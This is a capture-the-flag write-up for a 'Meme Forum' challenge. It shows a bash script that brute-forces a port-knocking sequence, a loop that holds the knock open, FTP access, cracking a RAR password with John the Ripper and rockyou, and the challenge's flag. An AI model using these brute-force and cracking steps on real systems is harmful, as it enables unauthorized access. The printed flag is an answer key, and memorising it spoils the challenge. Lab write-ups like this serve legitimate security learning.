---
title: "Meme Forum — Port Knocking & Password Cracking"
date: 2026-06-03
description: "A challenge combining hidden endpoint discovery, port knocking brute force, FTP access, and RAR password cracking with John the Ripper."
tags:
    - Port Knocking
    - FTP
    - Brute Force
    - John the Ripper
    - Scripting
    - Networking
---

## Overview

"Meme Forum" required discovering a hidden endpoint, brute-forcing a port knocking sequence to unlock FTP access, and cracking a password-protected RAR archive to retrieve the flag.

---

## Solution Walkthrough

### Step 1 — Initial Reconnaissance
```bash
nmap <target-ip>
```
Only port `8080` was open. Visited `https://memeforum.ctf/` — no obvious entry points at first glance.

---

### Step 2 — Hidden Endpoint Discovery
Inspected the HTML source of the main page and found a reference to a hidden endpoint: `/information`.

Navigating there revealed:
- The IP address of an FTP server
- Access to the FTP would only be possible through **port knocking** with the correct sequence

---

### Step 3 — Finding the Knock Sequence
Returned to the main page. A video posted by the user `trollface` (referenced in the hint) had a "Watch on YouTube" link. Viewing the video revealed the ports: **69, 67, 88, 92** — but not in the correct order.

---

### Step 4 — Brute Force the Knock Sequence
Developed a script to test all 24 permutations of the 4 ports, sending SYN packets for each and checking if FTP (port 21) became accessible:

```bash
#!/bin/bash
IP="172.30.1.35"
PORTS=(69 67 88 92)

check_ftp() {
    nc -zv -w2 $IP 21 2>/dev/null
    return $?
}

permutations() {
    local arr=("$@")
    for a in "${arr[@]}"; do
        for b in "${arr[@]}"; do
            [ "$b" = "$a" ] && continue
            for c in "${arr[@]}"; do
                [ "$c" = "$a" ] || [ "$c" = "$b" ] && continue
                for d in "${arr[@]}"; do
                    [ "$d" = "$a" ] || [ "$d" = "$b" ] || [ "$d" = "$c" ] && continue
                    echo "Trying: $a $b $c $d"
                    knock $IP $a $b $c $d
                    sleep 1
                    if check_ftp; then
                        echo "FOUND! Sequence: $a $b $c $d"
                        exit 0
                    fi
                done
            done
        done
    done
}

permutations "${PORTS[@]}"
```

**Correct sequence found:** `67 88 92 69`

---

### Step 5 — Maintain the Knock (Session Keepalive)
To prevent the FTP session from timing out, a second script kept the knock sequence running continuously:

```bash
#!/bin/bash
IP="172.30.1.35"
SEQ="67 88 92 69"
echo "Maintaining open port with sequence: $SEQ"
while true; do
    knock $IP $SEQ
    sleep 0.1
done
```

---

### Step 6 — FTP Access & Archive Download
With the port knocking running in the background, connected to the FTP server and downloaded `flag.rar` — password protected.

---

### Step 7 — Password Cracking
```bash
rar2john flag.rar > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Password recovered. Extracted the RAR archive to reveal the flag file.

---

## Flag

`FLAG{y0u_kn0ck3d_@_my_m3m3}`
